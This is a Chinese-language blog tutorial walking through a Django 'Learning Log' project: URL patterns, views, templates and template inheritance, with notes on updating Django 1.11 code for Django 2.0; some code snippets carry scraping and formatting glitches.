<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> django<span class="token punctuation">.</span>conf<span class="token punctuation">.</span>urls <span class="token keyword">import</span> include<span class="token punctuation">,</span> url
<span class="token keyword">from</span> django<span class="token punctuation">.</span>contrib <span class="token keyword">import</span> admin
urlpatterns <span class="token operator">=</span> <span class="token punctuation">[</span>
    url<span class="token punctuation">(</span>r<span class="token string">'^admin/'</span><span class="token punctuation">,</span>include<span class="token punctuation">(</span>admin<span class="token punctuation">.</span>site<span class="token punctuation">.</span>urls<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    url <span class="token punctuation">(</span>r<span class="token string">''</span><span class="token punctuation">,</span> include<span class="token punctuation">(</span><span class="token string">'learning_logs.urls'</span><span class="token punctuation">,</span>namespace<span class="token operator">=</span><span class="token string">'learning_logs'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>➊
<span class="token punctuation">]</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>在❶处，我们添加了一行代码来包含模块learning_logs.urls。这行代码包含实参namespace，让我们能够将learning_logs的URL同项目中的其他URL区分开来，这在项目开始扩展时很有帮助。</p>
<p>默认的urls.py包含在文件夹learning_log中，现在我们需要在文件夹learning_logs中创建另一个urls.py文件：</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token triple-quoted-string string">"""定义learning_ logs的URL模式"""</span>➊
<span class="token keyword">from</span> django<span class="token punctuation">.</span>conf<span class="token punctuation">.</span>urls <span class="token keyword">import</span> url❷
<span class="token keyword">from</span> <span class="token punctuation">.</span> <span class="token keyword">import</span> views❸
urlpatterns <span class="token operator">=</span> <span class="token punctuation">[</span>❹
    <span class="token comment" spellcheck="true"># 主页</span>
    url<span class="token punctuation">(</span>r<span class="token string">'^$'</span><span class="token punctuation">,</span> views<span class="token punctuation">.</span>index<span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>❺
<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>为弄清楚当前位于哪个urls.py文件中，我们在这个文件开头添加了一个文档字符串（见❶）。接下来，我们导入了函数url，因为我们需要使用它来将URL映射到视图（见❷）。我们还导入了模块views（见❸），其中的句点让Python从当前的urls.py模块所在的文件夹中导入视图。在这个模块中，变量urlpatterns是一个列表，包含可在应用程序learning_logs中请求的网页（见❹）。</p>
<p>实际的URL模式是一个对函数url()的调用，这个函数接受三个实参（见❺）。第一个是一个正则表达式。Django在urlpatterns中查找与请求的URL字符串匹配的正则表达式，因此正则表达式定义了Django可查找的模式。</p>
<p>我们来看看正则表达式<code>r'^$'</code>。其中的r让Python将接下来的字符串视为原始字符串，而引号告诉Python正则表达式始于和终于何处。脱字符（<code>^</code>）让Python查看字符串的开头，而美元符号让Python查看字符串的末尾。总体而言，这个正则表达式让Python查找开头和末尾之间没有任何东西的URL。Python忽略项目的基础URL（<a href="http://localhost:8000/），因此这个正则表达式与基础URL匹配。其他URL都与这个正则表达式不匹配。如果请求的URL不与任何URL模式匹配，Django将返回一个错误页面。">http://localhost:8000/），因此这个正则表达式与基础URL匹配。其他URL都与这个正则表达式不匹配。如果请求的URL不与任何URL模式匹配，Django将返回一个错误页面。</a></p>
<p>url()的第二个实参（见❺）指定了要调用的视图函数。请求的URL与前述正则表达式匹配时，Django将调用views.index（这个视图函数将在下一节编写）。第三个实参将这个URL模式的名称指定为index，让我们能够在代码的其他地方引用它。每当需要提供到这个主页的链接时，我们都将使用这个名称，而不编写URL。</p>
<h6 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h6><p>以上教程为Django1.11</p>
<p>在django2.0后不支持使用在urls.py中写</p>
<pre><code>url(r'^admin/', include(admin.site.urls))</code></pre><p>runserver后会发生报错</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210312202332.png" alt="image-20210309202615597"></p>
<p>，直接用</p>
<pre><code>path('admin/', admin.site.urls)</code></pre><p>,<br>对于应用中自定义urls.py文件的引用还是需要使用include()</p>
<p>百度一下得到改进办法</p>
<p>首先要修改<strong>learning_log\urls.py</strong></p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> django<span class="token punctuation">.</span>contrib <span class="token keyword">import</span> admin
<span class="token comment" spellcheck="true"># from django.conf.urls import include, url</span>
<span class="token keyword">from</span> django<span class="token punctuation">.</span>urls <span class="token keyword">import</span> path<span class="token punctuation">,</span>include

urlpatterns <span class="token operator">=</span> <span class="token punctuation">[</span>
    path<span class="token punctuation">(</span><span class="token string">'admin/'</span><span class="token punctuation">,</span> admin<span class="token punctuation">.</span>site<span class="token punctuation">.</span>urls<span class="token punctuation">)</span><span class="token punctuation">,</span>
    path<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span> include<span class="token punctuation">(</span><span class="token string">'learning_logs.urls'</span><span class="token punctuation">,</span> namespace<span class="token operator">=</span><span class="token string">'learning_logs'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token comment" spellcheck="true"># url(r'^admin/', include(admin.site.urls)),</span>
    <span class="token comment" spellcheck="true"># url(r'', include('learning_logs.urls', namespace='learning_logs')),Django2.0使用django.urls.path</span>
<span class="token punctuation">]</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>但只加入namespace会报错,必须在<strong>learning_logs\urls.py</strong>中定义变量app_name才行</p>
<p><strong>learning_logs\urls.py</strong></p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> django<span class="token punctuation">.</span>urls <span class="token keyword">import</span> path<span class="token punctuation">,</span> include<span class="token punctuation">,</span> re_path

<span class="token keyword">from</span> <span class="token punctuation">.</span> <span class="token keyword">import</span> views

urlpatterns <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token comment" spellcheck="true"># url(r'^$', views.index, name='index'),</span>
    re_path<span class="token punctuation">(</span><span class="token string">'^$'</span><span class="token punctuation">,</span> views<span class="token punctuation">.</span>index<span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'index'</span><span class="token punctuation">)</span>
<span class="token punctuation">]</span>

app_name <span class="token operator">=</span> <span class="token string">'learning_logs'</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>然后再运行runserver就不会出错了</p>
<blockquote>
<p>注意　正则表达式通常被称为regex，几乎每种编程语言都使用它。它们的用途多得难以置信，但需要经过一定的练习才能熟悉。如果你不明白前面介绍的内容，也不用担心，你在完成这个项目的过程中，将会看到很多正则表达式。</p>
</blockquote>
<h4 id="（二）编写视图"><a href="#（二）编写视图" class="headerlink" title="（二）编写视图"></a>（二）编写视图</h4><p>视图函数接受请求中的信息，准备好生成网页所需的数据，再将这些数据发送给浏览器——这通常是使用定义了网页是什么样的模板实现的。</p>
<p>learning_logs中的文件views.py是你执行命令python manage.py startapp时自动生成的，当前其内容如下：</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210312202333.png" alt="image-20210309181505592"></p>
<p>当前，这个文件只导入了函数render()，它根据视图提供的数据渲染响应。下面的代码演示了该如何为主页编写视图：</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> django<span class="token punctuation">.</span>shortcuts <span class="token keyword">import</span> render
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""学习笔记的主页"""</span>
    <span class="token keyword">return</span> render<span class="token punctuation">(</span>request<span class="token punctuation">,</span><span class="token string">'learning_logs/index.html'</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>URL请求与我们刚才定义的模式匹配时，Django将在文件views.py中查找函数index()，再将请求对象传递给这个视图函数。在这里，我们不需要处理任何数据，因此这个函数只包含调用render()的代码。这里向函数render()提供了两个实参：原始请求对象以及一个可用于创建网页的模板。下面来编写这个模板。</p>
<p>18.3.3 编写模板</p>
<p>模板定义了网页的结构。模板指定了网页是什么样的，而每当网页被请求时，Django将填入相关的数据。模板让你能够访问视图提供的任何数据。我们的主页视图没有提供任何数据，因此相应的模板非常简单。</p>
<p>在文件夹learning_logs中新建一个文件夹，并将其命名为templates。在文件夹templates中，再新建一个文件夹，并将其命名为learning_logs。这好像有点多余（我们在文件夹learning_logs中创建了文件夹templates，又在这个文件夹中创建了文件夹learning_logs），但建立了Django能够明确解读的结构，即便项目很大，包含很多应用程序亦如此。在最里面的文件夹learning_logs中，新建一个文件，并将其命名为index.html，再在这个文件中编写如下代码：</p>
<pre><code>&lt;p&gt;Learning Log&lt;/p&gt;
&lt;p&gt;Learning Log helps you keep track of your learning, for any topic you're learning about. &lt;/p&gt;</code></pre><p>这个文件非常简单。对于不熟悉HTML的读者，这里解释一下：</p>
<blockquote>
<p>标签<code>&lt;p&gt;&lt;/p&gt;</code>标识段落；标签<code>&lt;p&gt;</code>指出了段落的开头位置，而标签<code>&lt;/p&gt;</code>指出了段落的结束位置。这里定义了两个段落：第一个充当标题，第二个阐述了用户可使用“学习笔记”来做什么。</p>
</blockquote>
<p>现在，如果你请求这个项目的基础URL——<a href="http://localhost:8000/，将看到刚才创建的网页，而不是默认的Django网页。Django接受请求的URL，发现该URL与模式`r'^$'`匹配，因此调用函数views.index()，这将使用index.html包含的模板来渲染网页，结果如下图所示。">http://localhost:8000/，将看到刚才创建的网页，而不是默认的Django网页。Django接受请求的URL，发现该URL与模式`r'^$'`匹配，因此调用函数views.index()，这将使用index.html包含的模板来渲染网页，结果如下图所示。</a></p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210312202334.png" alt="image-20210309210605104"></p>
<p>创建网页的过程看起来可能很复杂，但将URL、视图和模板分离的效果实际上很好。这让我们能够分别考虑项目的不同方面，且在项目很大时，让各个参与者可专注于其最擅长的方面。例如，数据库专家可专注于模型，程序员可专注于视图代码，而Web设计人员可专注于模板。</p>
<h4 id="动手试一试-2"><a href="#动手试一试-2" class="headerlink" title="动手试一试"></a>动手试一试</h4><h5 id="18-5-膳食规划程序："><a href="#18-5-膳食规划程序：" class="headerlink" title="18-5 膳食规划程序："></a>18-5 膳食规划程序：</h5><p>假设你要创建一个应用程序，帮助用户规划一周的膳食。为此，新建一个文件夹，并将其命名为meal_planner，再在这个文件夹中新建一个Django项目。接下来，新建一个名为meal_plans的应用程序，并为这个项目创建一个简单的主页。</p>
<h5 id="18-6-比萨店主页："><a href="#18-6-比萨店主页：" class="headerlink" title="18-6 比萨店主页："></a>18-6 比萨店主页：</h5><p>在你为完成练习18-4而创建的项目Pizzeria中，添加一个主页。</p>
<h3 id="四、创建其他网页"><a href="#四、创建其他网页" class="headerlink" title="四、创建其他网页"></a>四、创建其他网页</h3><p>制定创建网页的流程后，可以开始扩充“学习笔记”项目了。我们将创建两个显示数据的网页，其中一个列出所有的主题，另一个显示特定主题的所有条目。对于每个网页，我们都将指定URL模式，编写一个视图函数，并编写一个模板。但这样做之前，我们先创建一个父模板，项目中的其他模板都将继承它。</p>
<h4 id="（一）模板继承"><a href="#（一）模板继承" class="headerlink" title="（一）模板继承"></a>（一）模板继承</h4><p>创建网站时，几乎都有一些所有网页都将包含的元素。在这种情况下，可编写一个包含通用元素的父模板，并让每个网页都继承这个模板，而不必在每个网页中重复定义这些通用元素。这种方法能让你专注于开发每个网页的独特方面，还能让修改项目的整体外观容易得多。</p>
<h5 id="1．父模板"><a href="#1．父模板" class="headerlink" title="1．父模板"></a>1．父模板</h5><p>我们首先来创建一个名为base.html的模板，并将其存储在index.html所在的目录中。这个文件包含所有页面都有的元素；其他的模板都继承base.html。当前，所有页面都包含的元素只有顶端的标题。我们将在每个页面中包含这个模板，因此我们将这个标题设置为到主页的链接：</p>
<pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span> {% url <span class="token punctuation">'</span>learning_logs:index<span class="token punctuation">'</span> %} <span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Learning Log<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span> ➊
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>
{% block content %} {% endblock content %}❷
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>这个文件的第一部分创建一个包含项目名的段落，该段落也是一个到主页的链接。为创建链接，我们使用了一个模板标签，它是用大括号和百分号<code>（{ % % }）</code>表示的。模板标签是一小段代码，生成要在网页中显示的信息。在这个实例中，模板标签<code>{ % url 'learning_logs:index' % }</code>生成一个URL，该URL与learning_logs/urls.py中定义的名为index的URL模式匹配（见❶）。在这个示例中，learning_logs是一个命名空间，而index是该命名空间中一个名称独特的URL模式。</p>
<p>在简单的HTML页面中，链接是使用锚标签定义的：</p>
<pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>link_url<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>link text<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>让模板标签来生成URL，可让链接保持最新容易得多。要修改项目中的URL，只需修改urls.py中的URL模式，这样网页被请求时，Django将自动插入修改后的URL。在我们的项目中，每个网页都将继承base.html，因此从现在开始，每个网页都包含到主页的链接。</p>
<p>在❶处，我们插入了一对块标签。这个块名为content，是一个占位符，其中包含的信息将由子模板指定。</p>
<p>子模板并非必须定义父模板中的每个块，因此在父模板中，可使用任意多个块来预留空间，而子模板可根据需要定义相应数量的块。</p>
<blockquote>
<p>注意　在Python代码中，我们几乎总是缩进四个空格。相比于Python文件，模板文件的缩进层级更多，因此每个层级通常只缩进两个空格。</p>
</blockquote>
<h5 id="2．子模板"><a href="#2．子模板" class="headerlink" title="2．子模板"></a>2．子模板</h5><p>现在需要重新编写index.html，使其继承base.html，如下所示：</p>
<pre class="line-numbers language-html"><code class="language-html">{% extends "learning_logs/base.html" %}➊
{% block content %} ❷
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>Learning Log helps you keep track of your learning, for any topic you're learning about. <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>
{% endblock content %}❸<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>如果将这些代码与原来的index.html进行比较，可发现我们将标题Learning Log替换成了从父模板那里继承的代码（见❶）。子模板的第一行必须包含标签<code>{ % extends % }</code>，让Django知道它继承了哪个父模板。文件base.html位于文件夹learning_logs中，因此父模板路径中包含learning_logs。这行代码导入模板base.html的所有内容，让index.html能够指定要在content块预留的空间中添加的内容。</p>
<p>在❷处，我们插入了一个名为content的<code>{ % block % }</code>标签，以定义content块。不是从父模板继承的内容都包含在content块中，在这里是一个描述项目“学习笔记”的段落。在❸处，我们使用标签<code>{ % endblock content % }</code>指出了内容定义的结束位置。</p>
<p>模板继承的优点开始显现出来了：在子模板中，只需包含当前网页特有的内容。这不仅简化了每个模板，还使得网站修改起来容易得多。要修改很多网页都包含的元素，只需在父模板中修改该元素，你所做的修改将传导到继承该父模板的每个页面。在包含数十乃至数百个网页的项目中，这种结构使得网站改进起来容易而且快捷得多。</p>
<blockquote>
<p>注意　在大型项目中，通常有一个用于整个网站的父模板——base.html，且网站的每个主要部分都有一个父模板。每个部分的父模板都继承base.html，而网站的每个网页都继承相应部分的父模板。这让你能够轻松地修改整个网站的外观、网站任何一部分的外观以及任何一个网页的外观。这种配置提供了一种效率极高的工作方式，让你乐意不断地去改进网站。</p>
</blockquote>
<h4 id="（二）显示所有主题的页面"><a href="#（二）显示所有主题的页面" class="headerlink" title="（二）显示所有主题的页面"></a>（二）显示所有主题的页面</h4><p>有了高效的网页创建方法，就能专注于另外两个网页了：显示全部主题的网页以及显示特定主题中条目的网页。所有主题页面显示用户创建的所有主题，它是第一个需要使用数据的网页。</p>
<h5 id="1．URL模式"><a href="#1．URL模式" class="headerlink" title="1．URL模式"></a>1．URL模式</h5><p>首先，我们来定义显示所有主题的页面的URL。通常，使用一个简单的URL片段来指出网页显示的信息；我们将使用单词topics，因此URL<a href="http://localhost:8000/topics/将返回显示所有主题的页面。下面演示了该如何修改learning_logs/urls.py：">http://localhost:8000/topics/将返回显示所有主题的页面。下面演示了该如何修改learning_logs/urls.py：</a></p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token triple-quoted-string string">"""定义learning_ logs的URL模式"""</span>
<span class="token keyword">from</span> django<span class="token punctuation">.</span>urls <span class="token keyword">import</span> path<span class="token punctuation">,</span> include<span class="token punctuation">,</span> re_path
<span class="token keyword">from</span> <span class="token punctuation">.</span> <span class="token keyword">import</span> views
urlpatterns <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token comment" spellcheck="true"># 主页</span>
    <span class="token comment" spellcheck="true"># url(r'^$', views.index, name='index'),</span>
    re_path<span class="token punctuation">(</span><span class="token string">'^$'</span><span class="token punctuation">,</span> views<span class="token punctuation">.</span>index<span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>

    <span class="token comment" spellcheck="true">#url(r'^topics/$',views.topics,name='topics'),</span>
    path<span class="token punctuation">(</span><span class="token string">'topics/'</span><span class="token punctuation">,</span>views<span class="token punctuation">.</span>topics<span class="token punctuation">,</span>name<span class="token operator">=</span><span class="token string">'topics'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>❶
<span class="token punctuation">]</span>

app_name <span class="token operator">=</span> <span class="token string">'learning_logs'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>我们只是在用于主页URL的正则表达式中添加了topics/（见❶）。Django检查请求的URL时，这个模式与这样的URL匹配：基础URL后面跟着topics。可以在末尾包含斜杠，也可以省略它，但单词topics后面不能有任何东西，否则就与该模式不匹配。其URL与该模式匹配的请求都将交给views.py中的函数topics()进行处理。</p>
<h5 id="2．视图"><a href="#2．视图" class="headerlink" title="2．视图"></a>2．视图</h5><p>函数topics()需要从数据库中获取一些数据，并将其发送给模板。我们需要在views.py中添加的代码如下：</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> django<span class="token punctuation">.</span>shortcuts <span class="token keyword">import</span> render
<span class="token keyword">from</span> <span class="token punctuation">.</span>models <span class="token keyword">import</span> Topic ➊
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">:</span>
<span class="token operator">-</span><span class="token operator">-</span> snip<span class="token operator">-</span><span class="token operator">-</span>
<span class="token keyword">def</span> <span class="token function">topics</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">:</span>❷
    <span class="token triple-quoted-string string">"""
    显示所有的主题
    """</span>
    topics <span class="token operator">=</span> Topic<span class="token punctuation">.</span>objects<span class="token punctuation">.</span>order_by<span class="token punctuation">(</span><span class="token string">'date_added'</span><span class="token punctuation">)</span>❸
    context <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'topics'</span><span class="token punctuation">:</span> topics<span class="token punctuation">}</span> ❹
    <span class="token keyword">return</span> render<span class="token punctuation">(</span>request<span class="token punctuation">,</span><span class="token string">'learning_logs/topics.html'</span><span class="token punctuation">,</span> context<span class="token punctuation">)</span>❺
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>我们首先导入了与所需数据相关联的模型（见❶）。函数topics()包含一个形参：Django从服务器那里收到的request对象（见❷）。在❸处，我们查询数据库——请求提供Topic对象，并按属性date_added对它们进行排序。我们将返回的查询集存储在topics中。</p>
<p>在❹处，我们定义了一个将要发送给模板的上下文。上下文是一个字典，其中的键是我们将在模板中用来访问数据的名称，而值是我们要发送给模板的数据。在这里，只有一个键—值对，它包含我们将在网页中显示的一组主题。创建使用数据的网页时，除对象request和模板的路径外，我们还将变量context传递给render()（见❺）。</p>
<h5 id="3．模板"><a href="#3．模板" class="headerlink" title="3．模板"></a>3．模板</h5><p>显示所有主题的页面的模板接受字典context，以便能够使用topics()提供的数据。请创建一个文件，将其命名为topics.html，并存储到index.html所在的目录中。下面演示了如何在这个模板中显示主题：</p>
<pre class="line-numbers language-html"><code class="language-html">{% extends "learning_logs/base.html" %}
{% block content %}
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>Topics<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token punctuation">></span></span>➊
{% for topic in topics %}❷
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>{{ topic }}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>❸
{% empty %}❹
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>code</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>code</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>html<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>No topics have been added yet. <span class="token comment" spellcheck="true">&lt;!--1i--></span>
{% endfor %}❺
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span>❻
{% endblock content %}
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>code</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>pre</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>就像模板index.html一样，我们首先使用标签<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>code</span><span class="token punctuation">></span></span>{ % extends % }<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>code</span><span class="token punctuation">></span></span>来继承base.html，再开始定义content块。这个网页的主体是一个项目列表，其中列出了用户输入的主题。在标准HTML中，项目列表被称为无序列表，用标签<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>code</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>code</span><span class="token punctuation">></span></span>表示。包含所有主题的项目列表始于❶处。<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>在❷处，我们使用了一个相当于for循环的模板标签，它遍历字典context中的列表topics。模板中使用的代码与Python代码存在一些重要差别：Python使用缩进来指出哪些代码行是for循环的组成部分，而在模板中，每个for循环都必须使用<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>code</span><span class="token punctuation">></span></span>{ % endfor %}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>code</span><span class="token punctuation">></span></span>标签来显式地指出其结束位置。因此在模板中，循环类似于下面这样：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>pre</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>code</span><span class="token punctuation">></span></span>{% foritem in list %}
do something with each item
{% endfor %}
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在循环中，我们要将每个主题转换为一个项目列表项。要在模板中打印变量，需要将变量名用双花括号括起来。每次循环时，❸处的代码<code>{ { topic } }</code>都被替换为topic的当前值。这些花括号不会出现在网页中，它们只是用于告诉Django我们使用了一个模板变量。HTML标签<code>&lt;li&gt;&lt;/li&gt;</code>表示一个项目列表项，在标签对<code>&lt;ul&gt;&lt;/ul&gt;</code>内部，位于标签<code>&lt;li&gt;</code>和<code>&lt;/li&gt;</code>之间的内容都是一个项目列表项。</p>
<p>在❹处，我们使用了模板标签<code>{ % empty % }</code>，它告诉Django在列表topics为空时该怎么办：这里是打印一条消息，告诉用户还没有添加任何主题。最后两行分别结束for循环（见❺）和项目列表（见❻）。</p>
<p>现在需要修改父模板，使其包含到显示所有主题的页面的链接：</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210312202335.png" alt="image-20210311162123896"></p>
<p>我们在到主页的链接后面添加了一个连字符（见❶），然后添加了一个到显示所有主题的页面的链接——使用的也是模板标签url（见❷）。这一行让Django生成一个链接，它与learning_logs/ urls.py中名为topics的URL模式匹配。</p>
<p>现在如果你刷新浏览器中的主页，将看到链接Topics。单击这个链接，将看到类似于图18-4所示的网页。</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210312202336.png" alt="image-20210311162244598"></p>
<h4 id="（三）显示特定主题的页面"><a href="#（三）显示特定主题的页面" class="headerlink" title="（三）显示特定主题的页面"></a>（三）显示特定主题的页面</h4><p>接下来，我们需要创建一个专注于特定主题的页面——显示该主题的名称及该主题的所有条目。同样，我们将定义一个新的URL模式，编写一个视图并创建一个模板。我们还将修改显示所有主题的网页，让每个项目列表项都是一个链接，单击它将显示相应主题的所有条目。</p>
<h5 id="1．URL模式-1"><a href="#1．URL模式-1" class="headerlink" title="1．URL模式"></a>1．URL模式</h5><p>显示特定主题的页面的URL模式与前面的所有URL模式都稍有不同，因为它将使用主题的id属性来指出请求的是哪个主题。例如，如果用户要查看主题Chess（其id为1）的详细页面，URL将为<a href="http://localhost:8000/topics/1/。下面是与这个URL匹配的模式，它包含在learning_logs/urls.py中：">http://localhost:8000/topics/1/。下面是与这个URL匹配的模式，它包含在learning_logs/urls.py中：</a></p>
<p>django1.11改法</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210312202337.png" alt="image-20210311163054782"></p>
<p>Django2.0改法：</p>
<p>我们来详细研究这个URL模式中的正则表达式——<code>r'^topics/(?P&lt;topic_id&gt;\d+)/$'</code>。r让Django将这个字符串视为原始字符串，并指出正则表达式包含在引号内。这个表达式的第二部分（<code>/(?P&lt;topic_id&gt;\d+)/</code>）与包含在两个斜杠内的整数匹配，并将这个整数存储在一个名为topic_id的实参中。这部分表达式两边的括号捕获URL中的值；<code>?P&lt;topic_id&gt;</code>将匹配的值存储到topic_id中；而表达式\d+与包含在两个斜杆内的任何数字都匹配，不管这个数字为多少位。</p>
<p>发现URL与这个模式匹配时，Django将调用视图函数topic()，并将存储在topic_id中的值作为实参传递给它。在这个函数中，我们将使用topic_id的值来获取相应的主题。</p>
<h5 id="2．视图-1"><a href="#2．视图-1" class="headerlink" title="2．视图"></a>2．视图</h5><p>函数topic()需要从数据库中获取指定的主题以及与之相关联的所有条目，如下所示：</p>
<p>views.py</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token operator">-</span><span class="token operator">-</span>snip<span class="token operator">-</span><span class="token operator">-</span>
<span class="token keyword">def</span> <span class="token function">topic</span><span class="token punctuation">(</span>request，topic_id<span class="token punctuation">)</span><span class="token punctuation">:</span> ➊
<span class="token triple-quoted-string string">"""显示单个主题及其所有的条目"""</span>
topic <span class="token operator">=</span> Topic<span class="token punctuation">.</span>objects<span class="token punctuation">.</span>get<span class="token punctuation">(</span>id<span class="token operator">=</span>topic_id<span class="token punctuation">)</span>❷
entries <span class="token operator">=</span> topic<span class="token punctuation">.</span>entry_set<span class="token punctuation">.</span> order_by<span class="token punctuation">(</span><span class="token string">'-date_added'</span><span class="token punctuation">)</span>❸
context <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'topic'</span><span class="token punctuation">:</span> topic<span class="token punctuation">,</span> <span class="token string">'entries'</span><span class="token punctuation">:</span> entries<span class="token punctuation">}</span> ❹
<span class="token keyword">return</span> render<span class="token punctuation">(</span>request<span class="token punctuation">,</span><span class="token string">'learning_logs/topic.html'</span><span class="token punctuation">,</span> context<span class="token punctuation">)</span>❺
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
